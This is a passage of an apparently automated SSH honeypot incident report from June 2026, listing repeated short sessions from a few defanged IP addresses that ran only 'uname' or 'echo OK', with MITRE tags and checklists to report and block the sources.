| `2026-06-27 09:13:18` | `cowrie.client.kex` |
| `2026-06-27 09:13:18` | `cowrie.login.success` |
| `2026-06-27 09:13:19` | `cowrie.session.params` |
| `2026-06-27 09:13:19` | `cowrie.command.input` |
| `2026-06-27 09:13:19` | `cowrie.log.closed` |
| `2026-06-27 09:13:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8356b0a8a0ec

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 09:14 |
| **Last Seen** | 2026-06-27 09:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 09:14:14` | `cowrie.session.connect` |
| `2026-06-27 09:14:14` | `cowrie.client.version` |
| `2026-06-27 09:14:14` | `cowrie.client.kex` |
| `2026-06-27 09:14:14` | `cowrie.login.success` |
| `2026-06-27 09:14:15` | `cowrie.session.params` |
| `2026-06-27 09:14:15` | `cowrie.command.input` |
| `2026-06-27 09:14:15` | `cowrie.log.closed` |
| `2026-06-27 09:14:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d7f888eef9a8

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 09:15 |
| **Last Seen** | 2026-06-27 09:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 09:15:09` | `cowrie.session.connect` |
| `2026-06-27 09:15:09` | `cowrie.client.version` |
| `2026-06-27 09:15:09` | `cowrie.client.kex` |
| `2026-06-27 09:15:09` | `cowrie.login.success` |
| `2026-06-27 09:15:10` | `cowrie.session.params` |
| `2026-06-27 09:15:10` | `cowrie.command.input` |
| `2026-06-27 09:15:10` | `cowrie.log.closed` |
| `2026-06-27 09:15:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-012fb8ceb27b

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 09:16 |
| **Last Seen** | 2026-06-27 09:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 09:16:06` | `cowrie.session.connect` |
| `2026-06-27 09:16:06` | `cowrie.client.version` |
| `2026-06-27 09:16:06` | `cowrie.client.kex` |
| `2026-06-27 09:16:06` | `cowrie.login.success` |
| `2026-06-27 09:16:07` | `cowrie.session.params` |
| `2026-06-27 09:16:07` | `cowrie.command.input` |
| `2026-06-27 09:16:07` | `cowrie.log.closed` |
| `2026-06-27 09:16:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c6d3766b6dc6

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 09:17 |
| **Last Seen** | 2026-06-27 09:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 09:17:04` | `cowrie.session.connect` |
| `2026-06-27 09:17:04` | `cowrie.client.version` |
| `2026-06-27 09:17:04` | `cowrie.client.kex` |
| `2026-06-27 09:17:04` | `cowrie.login.success` |
| `2026-06-27 09:17:05` | `cowrie.session.params` |
| `2026-06-27 09:17:05` | `cowrie.command.input` |
| `2026-06-27 09:17:05` | `cowrie.log.closed` |
| `2026-06-27 09:17:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-81a76160e4c5

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 09:18 |
| **Last Seen** | 2026-06-27 09:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 09:18:03` | `cowrie.session.connect` |
| `2026-06-27 09:18:03` | `cowrie.client.version` |
| `2026-06-27 09:18:03` | `cowrie.client.kex` |
| `2026-06-27 09:18:03` | `cowrie.login.success` |
| `2026-06-27 09:18:04` | `cowrie.session.params` |
| `2026-06-27 09:18:04` | `cowrie.command.input` |
| `2026-06-27 09:18:04` | `cowrie.log.closed` |
| `2026-06-27 09:18:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-56d45a85ad16

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 09:19 |
| **Last Seen** | 2026-06-27 09:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 09:19:02` | `cowrie.session.connect` |
| `2026-06-27 09:19:02` | `cowrie.client.version` |
| `2026-06-27 09:19:02` | `cowrie.client.kex` |
| `2026-06-27 09:19:02` | `cowrie.login.success` |
| `2026-06-27 09:19:03` | `cowrie.session.params` |
| `2026-06-27 09:19:03` | `cowrie.command.input` |
| `2026-06-27 09:19:03` | `cowrie.log.closed` |
| `2026-06-27 09:19:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e0c96d07aeac

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 09:20 |
| **Last Seen** | 2026-06-27 09:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 09:20:00` | `cowrie.session.connect` |
| `2026-06-27 09:20:00` | `cowrie.client.version` |
| `2026-06-27 09:20:00` | `cowrie.client.kex` |
| `2026-06-27 09:20:00` | `cowrie.login.success` |
| `2026-06-27 09:20:01` | `cowrie.session.params` |
| `2026-06-27 09:20:01` | `cowrie.command.input` |
| `2026-06-27 09:20:01` | `cowrie.log.closed` |
| `2026-06-27 09:20:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c0f5670d34a

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-06-27 09:20 |
| **Last Seen** | 2026-06-27 09:20 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 09:20:28` | `cowrie.session.connect` |
| `2026-06-27 09:20:28` | `cowrie.client.version` |
| `2026-06-27 09:20:28` | `cowrie.client.kex` |
| `2026-06-27 09:20:30` | `cowrie.login.success` |
| `2026-06-27 09:20:31` | `cowrie.session.params` |
| `2026-06-27 09:20:31` | `cowrie.command.input` |
| `2026-06-27 09:20:32` | `cowrie.log.closed` |
| `2026-06-27 09:20:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-10958f95d9d6

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 09:20 |
| **Last Seen** | 2026-06-27 09:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 09:20:57` | `cowrie.session.connect` |
| `2026-06-27 09:20:57` | `cowrie.client.version` |
| `2026-06-27 09:20:57` | `cowrie.client.kex` |
| `2026-06-27 09:20:58` | `cowrie.login.success` |
| `2026-06-27 09:20:59` | `cowrie.session.params` |
| `2026-06-27 09:20:59` | `cowrie.command.input` |
| `2026-06-27 09:20:59` | `cowrie.log.closed` |
| `2026-06-27 09:20:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d1cbef248f2b

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 09:21 |
| **Last Seen** | 2026-06-27 09:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 09:21:56` | `cowrie.session.connect` |
| `2026-06-27 09:21:56` | `cowrie.client.version` |
| `2026-06-27 09:21:56` | `cowrie.client.kex` |
| `2026-06-27 09:21:56` | `cowrie.login.success` |
| `2026-06-27 09:21:57` | `cowrie.session.params` |
| `2026-06-27 09:21:57` | `cowrie.command.input` |
| `2026-06-27 09:21:57` | `cowrie.log.closed` |
| `2026-06-27 09:21:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-34f78fb7d115

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-27 09:22 |
| **Last Seen** | 2026-06-27 09:22 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 09:22:11` | `cowrie.session.connect` |
| `2026-06-27 09:22:13` | `cowrie.client.version` |
| `2026-06-27 09:22:13` | `cowrie.client.kex` |
| `2026-06-27 09:22:19` | `cowrie.login.success` |
| `2026-06-27 09:22:22` | `cowrie.session.params` |
| `2026-06-27 09:22:22` | `cowrie.command.input` |
| `2026-06-27 09:22:24` | `cowrie.log.closed` |
| `2026-06-27 09:22:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7a2c670c9dbb

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 09:22 |
| **Last Seen** | 2026-06-27 09:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 09:22:55` | `cowrie.session.connect` |
| `2026-06-27 09:22:55` | `cowrie.client.version` |
| `2026-06-27 09:22:56` | `cowrie.client.kex` |
| `2026-06-27 09:22:56` | `cowrie.login.success` |
| `2026-06-27 09:22:57` | `cowrie.session.params` |
| `2026-06-27 09:22:57` | `cowrie.command.input` |
| `2026-06-27 09:22:57` | `cowrie.log.closed` |
| `2026-06-27 09:22:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb7d2d239f8a

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 09:23 |
| **Last Seen** | 2026-06-27 09:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 09:23:57` | `cowrie.session.connect` |
| `2026-06-27 09:23:57` | `cowrie.client.version` |
| `2026-06-27 09:23:57` | `cowrie.client.kex` |
| `2026-06-27 09:23:57` | `cowrie.login.success` |
| `2026-06-27 09:23:58` | `cowrie.session.params` |
| `2026-06-27 09:23:58` | `cowrie.command.input` |
| `2026-06-27 09:23:58` | `cowrie.log.closed` |
| `2026-06-27 09:23:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e8c481395334

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 09:24 |
| **Last Seen** | 2026-06-27 09:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 09:24:57` | `cowrie.session.connect` |
| `2026-06-27 09:24:57` | `cowrie.client.version` |
| `2026-06-27 09:24:57` | `cowrie.client.kex` |
| `2026-06-27 09:24:57` | `cowrie.login.success` |
| `2026-06-27 09:24:58` | `cowrie.session.params` |
| `2026-06-27 09:24:58` | `cowrie.command.input` |
| `2026-06-27 09:24:58` | `cowrie.log.closed` |
| `2026-06-27 09:24:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-07df5a80a4da

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]92` |
| **First Seen** | 2026-06-27 09:26 |
| **Last Seen** | 2026-06-27 09:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 09:26:03` | `cowrie.session.connect` |
| `2026-06-27 09:26:03` | `cowrie.client.version` |
| `2026-06-27 09:26:03` | `cowrie.client.kex` |
| `2026-06-27 09:26:04` | `cowrie.login.success` |
| `2026-06-27 09:26:04` | `cowrie.session.params` |
| `2026-06-27 09:26:04` | `cowrie.command.input` |
| `2026-06-27 09:26:05` | `cowrie.log.closed` |
| `2026-06-27 09:26:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]92` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]92` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c71731296eb7

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 09:26 |
| **Last Seen** | 2026-06-27 09:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 09:26:57` | `cowrie.session.connect` |
| `2026-06-27 09:26:57` | `cowrie.client.version` |
| `2026-06-27 09:26:57` | `cowrie.client.kex` |
| `2026-06-27 09:26:57` | `cowrie.login.success` |
| `2026-06-27 09:26:58` | `cowrie.session.params` |
| `2026-06-27 09:26:58` | `cowrie.command.input` |
| `2026-06-27 09:26:58` | `cowrie.log.closed` |
| `2026-06-27 09:26:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f22ea926709f

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 09:27 |
| **Last Seen** | 2026-06-27 09:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 09:27:55` | `cowrie.session.connect` |
| `2026-06-27 09:27:55` | `cowrie.client.version` |
| `2026-06-27 09:27:55` | `cowrie.client.kex` |
| `2026-06-27 09:27:56` | `cowrie.login.success` |
| `2026-06-27 09:27:56` | `cowrie.session.params` |
| `2026-06-27 09:27:56` | `cowrie.command.input` |
| `2026-06-27 09:27:56` | `cowrie.log.closed` |
| `2026-06-27 09:27:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e8a43a86ed52

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 09:28 |
| **Last Seen** | 2026-06-27 09:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 09:28:54` | `cowrie.session.connect` |
| `2026-06-27 09:28:54` | `cowrie.client.version` |
| `2026-06-27 09:28:54` | `cowrie.client.kex` |
| `2026-06-27 09:28:54` | `cowrie.login.success` |
| `2026-06-27 09:28:55` | `cowrie.session.params` |
| `2026-06-27 09:28:55` | `cowrie.command.input` |
| `2026-06-27 09:28:55` | `cowrie.log.closed` |
| `2026-06-27 09:28:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-606b6bfccc71

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 09:29 |
| **Last Seen** | 2026-06-27 09:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 09:29:54` | `cowrie.session.connect` |
| `2026-06-27 09:29:54` | `cowrie.client.version` |
| `2026-06-27 09:29:54` | `cowrie.client.kex` |
| `2026-06-27 09:29:54` | `cowrie.login.success` |
| `2026-06-27 09:29:55` | `cowrie.session.params` |
| `2026-06-27 09:29:55` | `cowrie.command.input` |
| `2026-06-27 09:29:55` | `cowrie.log.closed` |
| `2026-06-27 09:29:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0333e426f263

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 09:30 |
| **Last Seen** | 2026-06-27 09:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 09:30:58` | `cowrie.session.connect` |
| `2026-06-27 09:30:58` | `cowrie.client.version` |
| `2026-06-27 09:30:58` | `cowrie.client.kex` |
| `2026-06-27 09:30:58` | `cowrie.login.success` |
| `2026-06-27 09:30:59` | `cowrie.session.params` |
| `2026-06-27 09:30:59` | `cowrie.command.input` |
| `2026-06-27 09:30:59` | `cowrie.log.closed` |
| `2026-06-27 09:30:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-efa81140a6d3

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 09:32 |
| **Last Seen** | 2026-06-27 09:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 09:32:00` | `cowrie.session.connect` |
| `2026-06-27 09:32:00` | `cowrie.client.version` |
| `2026-06-27 09:32:00` | `cowrie.client.kex` |
| `2026-06-27 09:32:00` | `cowrie.login.success` |
| `2026-06-27 09:32:01` | `cowrie.session.params` |
| `2026-06-27 09:32:01` | `cowrie.command.input` |
| `2026-06-27 09:32:01` | `cowrie.log.closed` |
| `2026-06-27 09:32:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a5d7ca2db5ce

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 09:32 |
| **Last Seen** | 2026-06-27 09:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 09:32:59` | `cowrie.session.connect` |
| `2026-06-27 09:32:59` | `cowrie.client.version` |
| `2026-06-27 09:32:59` | `cowrie.client.kex` |
| `2026-06-27 09:32:59` | `cowrie.login.success` |
| `2026-06-27 09:33:00` | `cowrie.session.params` |
| `2026-06-27 09:33:00` | `cowrie.command.input` |
| `2026-06-27 09:33:00` | `cowrie.log.closed` |
| `2026-06-27 09:33:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3cbea592938c

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-27 09:33 |
| **Last Seen** | 2026-06-27 09:33 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 09:33:10` | `cowrie.session.connect` |
| `2026-06-27 09:33:11` | `cowrie.client.version` |
| `2026-06-27 09:33:11` | `cowrie.client.kex` |
| `2026-06-27 09:33:18` | `cowrie.login.success` |
| `2026-06-27 09:33:21` | `cowrie.session.params` |
| `2026-06-27 09:33:21` | `cowrie.command.input` |
| `2026-06-27 09:33:22` | `cowrie.log.closed` |
| `2026-06-27 09:33:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-85c02d9bccd1

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 09:33 |
| **Last Seen** | 2026-06-27 09:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 09:33:59` | `cowrie.session.connect` |
| `2026-06-27 09:33:59` | `cowrie.client.version` |
| `2026-06-27 09:33:59` | `cowrie.client.kex` |
| `2026-06-27 09:34:00` | `cowrie.login.success` |
| `2026-06-27 09:34:00` | `cowrie.session.params` |
| `2026-06-27 09:34:00` | `cowrie.command.input` |
| `2026-06-27 09:34:01` | `cowrie.log.closed` |
| `2026-06-27 09:34:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c944814bf1fb

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-06-27 09:35 |
| **Last Seen** | 2026-06-27 09:35 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 09:35:01` | `cowrie.session.connect` |
| `2026-06-27 09:35:02` | `cowrie.client.version` |
| `2026-06-27 09:35:02` | `cowrie.client.kex` |
| `2026-06-27 09:35:03` | `cowrie.login.success` |
| `2026-06-27 09:35:04` | `cowrie.session.params` |
| `2026-06-27 09:35:04` | `cowrie.command.input` |
| `2026-06-27 09:35:05` | `cowrie.log.closed` |
| `2026-06-27 09:35:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a8817009e061

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 09:35 |
| **Last Seen** | 2026-06-27 09:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
